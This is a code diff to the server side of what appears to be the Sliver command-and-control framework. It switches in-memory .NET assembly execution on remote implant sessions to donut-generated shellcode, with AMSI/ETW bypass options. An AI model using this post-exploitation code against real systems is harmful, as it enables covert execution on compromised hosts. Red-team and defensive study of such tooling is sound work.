@@ -27,13 +27,11 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
-	"path"
 	"strings"
 
 	"github.com/binject/go-donut/donut"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/bishopfox/sliver/server/assets"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/generate"
 
@@ -96,34 +94,30 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 	if session == nil {
 		return nil, ErrInvalidSessionID
 	}
+	shellcode, err := generate.DonutFromAssembly(
+		req.Assembly,
+		req.IsDLL,
+		req.Bypass,
+		req.Arch,
+		req.Arguments,
+		req.Method,
+		req.ClassName,
+		req.AppDomain,
+	)
+	if err != nil {
+		return nil, err
+	}
 
-	// We have to add the hosting DLL to the request before forwarding it to the implant
-	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
-	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
-	if err != nil {
-		return nil, err
-	}
-	offset, err := getExportOffset(hostingDllPath, "ReflectiveLoader")
-	if err != nil {
-		return nil, err
-	}
-	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
-		Request:    req.Request,
-		Assembly:   req.Assembly,
-		HostingDll: hostingDllBytes,
-		Arguments:  req.Arguments,
-		Process:    req.Process,
-		AmsiBypass: req.AmsiBypass,
-		EtwBypass:  req.EtwBypass,
-		Offset:     offset,
+	reqData, err := proto.Marshal(&sliverpb.InvokeExecuteAssemblyReq{
+		Data:    shellcode,
+		Process: req.Process,
 	})
 	if err != nil {
 		return nil, err
 	}
-
 	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
 	timeout := rpc.getTimeout(req)
-	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
+	respData, err := session.Request(sliverpb.MsgInvokeExecuteAssemblyReq, timeout, reqData)
 	if err != nil {
 		return nil, err
 	}
@@ -133,7 +127,53 @@ func (rpc *Server) ExecuteAssembly(ctx context.Context, req *sliverpb.ExecuteAss
 		return nil, err
 	}
 	return resp, nil
+
 }
+
+// ExecuteAssemblyOld - Execute a .NET assembly on the remote system in-memory (Windows only)
+// func (rpc *Server) ExecuteAssemblyOld(ctx context.Context, req *sliverpb.ExecuteAssemblyReq) (*sliverpb.ExecuteAssembly, error) {
+// 	session := core.Sessions.Get(req.Request.SessionID)
+// 	if session == nil {
+// 		return nil, ErrInvalidSessionID
+// 	}
+
+// 	// We have to add the hosting DLL to the request before forwarding it to the implant
+// 	hostingDllPath := path.Join(assets.GetDataDir(), "HostingCLRx64.dll")
+// 	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
+// 	if err != nil {
+// 		return nil, err
+// 	}
+// 	offset, err := getExportOffset(hostingDllPath, "ReflectiveLoader")
+// 	if err != nil {
+// 		return nil, err
+// 	}
+// 	reqData, err := proto.Marshal(&sliverpb.ExecuteAssemblyReq{
+// 		Request:    req.Request,
+// 		Assembly:   req.Assembly,
+// 		HostingDll: hostingDllBytes,
+// 		Arguments:  req.Arguments,
+// 		Process:    req.Process,
+// 		AmsiBypass: req.AmsiBypass,
+// 		EtwBypass:  req.EtwBypass,
+// 		Offset:     offset,
+// 	})
+// 	if err != nil {
+// 		return nil, err
+// 	}
+
+// 	rpcLog.Infof("Sending execute assembly request to session %d\n", req.Request.SessionID)
+// 	timeout := rpc.getTimeout(req)
+// 	respData, err := session.Request(sliverpb.MsgExecuteAssemblyReq, timeout, reqData)
+// 	if err != nil {
+// 		return nil, err
+// 	}
+// 	resp := &sliverpb.ExecuteAssembly{}
+// 	err = proto.Unmarshal(respData, resp)
+// 	if err != nil {
+// 		return nil, err
+// 	}
+// 	return resp, nil
+// }
 
 // Sideload - Sideload a DLL on the remote system (Windows only)
 func (rpc *Server) Sideload(ctx context.Context, req *sliverpb.SideloadReq) (*sliverpb.Sideload, error) {
